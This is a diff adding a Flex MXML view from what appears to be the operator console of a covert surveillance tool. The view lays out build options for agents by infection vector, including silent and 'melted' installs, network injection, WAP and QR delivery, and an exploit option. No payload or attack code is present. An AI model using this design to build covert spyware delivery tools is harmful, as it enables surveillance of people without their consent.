@@ -1,0 +1,54 @@
+<?xml version="1.0" encoding="utf-8"?>
+<s:SkinnableContainer xmlns:fx="http://ns.adobe.com/mxml/2009" 
+         xmlns:s="library://ns.adobe.com/flex/spark" 
+         xmlns:mx="library://ns.adobe.com/flex/mx" width="100%" height="100%" xmlns:build="it.ht.rcs.console.operations.view.agents.build.*" xmlns:mobile="it.ht.rcs.console.operations.view.agents.build.mobile.*" xmlns:desktop="it.ht.rcs.console.operations.view.agents.build.desktop.*" >
+  <fx:Script>
+    <![CDATA[
+      import it.ht.rcs.console.agent.model.Agent;
+      
+      [Bindable]
+      public var desc:String;
+      [Bindable]
+      public var platform:String;
+      [Bindable]
+      public var factory:Agent;
+    ]]>
+  </fx:Script>
+  <s:states>
+    <s:State name="none"/>
+    
+    <s:State name="dsk_silent"/>
+    <s:State name="dsk_melted"/>
+    <s:State name="dsk_offline"/>
+    <s:State name="dsk_U3"/>
+    <s:State name="dsk_applet"/>
+    <s:State name="dsk_nia"/>
+    
+    <s:State name="mob_local"/>
+    <s:State name="mob_silent"/>
+    <s:State name="mob_melted"/>
+    <s:State name="mob_wap"/>
+    <s:State name="mob_qr"/>
+
+    <s:State name="exploit"/>
+  </s:states>
+  
+    <s:TextArea left="0" right="0" top="0" height="50" borderVisible="false" contentBackgroundAlpha="0.0" editable="false" text="{desc}"/>
+  
+    <s:Group left="0" right="0" top="50" bottom="0">
+      <desktop:DskSilent includeIn="dsk_silent" platform="{platform}"/>
+      <desktop:DskMelted includeIn="dsk_melted" platform="{platform}"/>
+      <desktop:DskOffline includeIn="dsk_offline" platform="{platform}"/>
+      <desktop:DskU3 includeIn="dsk_U3" platform="{platform}"/>
+      <desktop:DskApplet includeIn="dsk_applet" platform="{platform}"/>
+      <desktop:DskNia includeIn="dsk_nia"/>
+      
+      <mobile:MobLocal includeIn="mob_local" platform="{platform}"/>
+      <mobile:MobSilent includeIn="mob_silent" platform="{platform}"/>
+      <mobile:MobMelted includeIn="mob_melted" platform="{platform}"/>
+      <mobile:MobWap includeIn="mob_wap" platform="{platform}"/>
+      <mobile:MobQR includeIn="mob_qr" platform="{platform}"/>
+      <build:BuildExploit includeIn="exploit" platform="{platform}"/>    
+    </s:Group>    
+  
+</s:SkinnableContainer>
